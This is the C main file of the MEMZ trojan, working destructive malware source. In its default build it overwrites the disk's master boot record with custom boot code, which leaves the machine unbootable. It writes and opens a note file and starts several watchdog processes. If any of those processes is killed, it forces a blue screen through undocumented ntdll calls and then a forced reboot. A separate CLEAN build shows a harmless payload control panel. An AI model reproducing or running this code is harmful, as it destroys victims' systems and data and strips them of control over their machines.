#include "memz.h"

int scrw, scrh;

#ifdef CLEAN
HFONT font;
#endif

void main() {
	scrw = GetSystemMetrics(SM_CXSCREEN);
	scrh = GetSystemMetrics(SM_CYSCREEN);

#ifndef CLEAN
	int argc;
	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc > 1) {
		if (!lstrcmpW(argv[1], L"/watchdog")) {
			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

			WNDCLASSEX c;
			c.cbSize = sizeof(WNDCLASSEX);
			c.lpfnWndProc = WindowProc;
			c.lpszClassName = "hax";
			c.style = 0;
			c.cbClsExtra = 0;
			c.cbWndExtra = 0;
			c.hInstance = NULL;
			c.hIcon = 0;
			c.hCursor = 0;
			c.hbrBackground = 0;
			c.lpszMenuName = NULL;
			c.hIconSm = 0;

			RegisterClassEx(&c);

			HWND hwnd = CreateWindowEx(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

			MSG msg;
			while (GetMessage(&msg, NULL, 0, 0) > 0) {
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	} else {
		char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 8192);
		GetModuleFileNameA(NULL, fn, 8192);

		for (int i = 0; i < 5; i++)
			ShellExecuteA(NULL, NULL, fn, "/watchdog", NULL, SW_SHOWDEFAULT);

		SHELLEXECUTEINFO info;
		info.cbSize = sizeof(SHELLEXECUTEINFO);
		info.lpFile = fn;
		info.lpParameters = "/main";
		info.fMask = SEE_MASK_NOCLOSEPROCESS;
		info.hwnd = NULL;
		info.lpVerb = NULL;
		info.lpDirectory = NULL;
		info.hInstApp = NULL;
		info.nShow = SW_SHOWDEFAULT;

		ShellExecuteEx(&info);

		SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);

		ExitProcess(0);
	}

	HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE)
		ExitProcess(2);

	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

	// Join the two code parts together
	int i = 0;
	for (; i < code1_len; i++)
		*(bootcode + i) = *(code1 + i);
	for (i = 0; i < code2_len; i++)
		*(bootcode + i + 0x1fe) = *(code2 + i);

	DWORD wb;
	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
		ExitProcess(3);

	CloseHandle(drive);

	HANDLE note = CreateFile("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);

	if (!WriteFile(note, msg, msg_len, &wb, NULL))
		ExitProcess(5);

	CloseHandle(note);
	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);

	for (int p = 0; p < nPayloads; p++) {
		Sleep(payloads[p].delay);
		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(10000);
	}

#else // CLEAN
	InitCommonControls();

	LOGFONT lf;
	GetObject(GetStockObject(DEFAULT_GUI_FONT), sizeof(LOGFONT), &lf);
	font = CreateFont(lf.lfHeight, lf.lfWidth,
		lf.lfEscapement, lf.lfOrientation, lf.lfWeight,
		lf.lfItalic, lf.lfUnderline, lf.lfStrikeOut, lf.lfCharSet,
		lf.lfOutPrecision, lf.lfClipPrecision, lf.lfQuality,
		lf.lfPitchAndFamily, lf.lfFaceName);

	WNDCLASSEX c;
	c.cbSize = sizeof(WNDCLASSEX);
	c.lpfnWndProc = WindowProc;
	c.lpszClassName = L"MEMZPanel";
	c.style = CS_HREDRAW | CS_VREDRAW;
	c.cbClsExtra = 0;
	c.cbWndExtra = 0;
	c.hInstance = NULL;
	c.hIcon = 0;
	c.hCursor = 0;
	c.hbrBackground = (HBRUSH)(COLOR_3DFACE+1);
	c.lpszMenuName = NULL;
	c.hIconSm = 0;

	RegisterClassEx(&c);

	RECT rect;
	rect.left = 0;
	rect.right = WINDOWWIDTH;
	rect.top = 0;
	rect.bottom = WINDOWHEIGHT;

	AdjustWindowRect(&rect, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);

	HWND hwnd = CreateWindowEx(0, L"MEMZPanel", L"MEMZ Clean Version - Payload Panel", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
		50, 50, rect.right-rect.left, rect.bottom-rect.top, NULL, NULL, GetModuleHandle(NULL), NULL);

	for (int p = 0; p < nPayloads; p++) {
		payloads[p].btn = CreateWindowW(L"BUTTON", payloads[p].name, WS_VISIBLE | WS_CHILD | WS_TABSTOP | BS_PUSHLIKE | BS_AUTOCHECKBOX | BS_NOTIFY,
			(p%COLUMNS)*BTNWIDTH+SPACE*(p%COLUMNS+1), (p/COLUMNS)*BTNHEIGHT + SPACE*(p/COLUMNS+1), BTNWIDTH, BTNHEIGHT,
			hwnd, NULL, (HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE), NULL);
		SendMessage(payloads[p].btn, WM_SETFONT, (WPARAM)font, TRUE);

		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
	}

	SendMessage(hwnd, WM_SETFONT, (WPARAM)font, TRUE);

	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);
	
	CreateThread(NULL, NULL, &keyboardThread, NULL, NULL, NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
#endif
}

#ifndef CLEAN
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
		killWindows();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

DWORD WINAPI watchdogThread(LPVOID parameter) {
	int oproc = 0;

	char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

	Sleep(1000);

	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		Process32First(snapshot, &proc);

		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);

			if (!lstrcmpA(fn, fn2)) {
				nproc++;
			}

			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (nproc < oproc) {
			killWindows();
		}

		oproc = nproc;

		Sleep(10);
	}
}

void killWindows() {
	// Show cool MessageBoxes
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(100);
	}

	killWindowsInstant();
}

void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibrary("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBox(NULL, (LPCSTR)msgs[random() % nMsgs], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
#else // CLEAN
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	PAINTSTRUCT ps;
	HDC hdc;
	
	switch (msg) {
	case WM_DESTROY:
		ExitProcess(0);
		break;
	case WM_COMMAND:
		if (wParam == BN_CLICKED) {}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hwnd, &ps);
		SelectObject(hdc, font);
		TextOut(hdc, 10, WINDOWHEIGHT - 20, L"Press SHIFT+ESC to stop all payloads! Press CTRL+SHIFT+S to increase speed.", 75);
		EndPaint(hwnd, &ps);
		return 0;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
		break;
	}

	return 0;
}

DWORD WINAPI keyboardThread(LPVOID lParam) {
	for (;;) {
		if ((GetKeyState(VK_SHIFT) & GetKeyState(VK_ESCAPE)) & 0x8000) {
			for (int p = 0; p < nPayloads; p++) {
				SendMessage(payloads[p].btn, BM_SETCHECK, BST_UNCHECKED, NULL);
			}

			RECT rect;
			HWND desktop = GetDesktopWindow();
			GetWindowRect(desktop, &rect);

			RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		} else if ((GetKeyState(VK_SHIFT) & GetKeyState(VK_CONTROL) & GetKeyState('S')) & 0x8000) {
			for (int p = 0; p < nPayloads; p++) {
				payloads[p].runtime += 2000;
				payloads[p].times += 10;
			}
		}

		Sleep(100);
	}

	return 0;
}
#endif


